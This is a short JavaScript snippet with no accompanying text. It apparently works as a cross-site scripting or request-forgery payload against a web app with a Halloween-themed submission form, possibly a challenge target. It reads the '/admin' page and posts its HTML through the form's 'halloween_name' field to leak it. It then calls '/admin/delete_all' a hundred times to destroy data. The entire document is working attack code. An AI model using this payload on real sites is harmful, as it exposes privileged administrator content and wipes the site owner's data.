fetch('/admin').then(r=>r.text()).then(html=>{
  fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({halloween_name:html,email:'x@x.com',costume_type:'ghost',trick_or_treat:'tricks'})});
  for(let i=0;i<100;i++) fetch('/admin/delete_all');
});
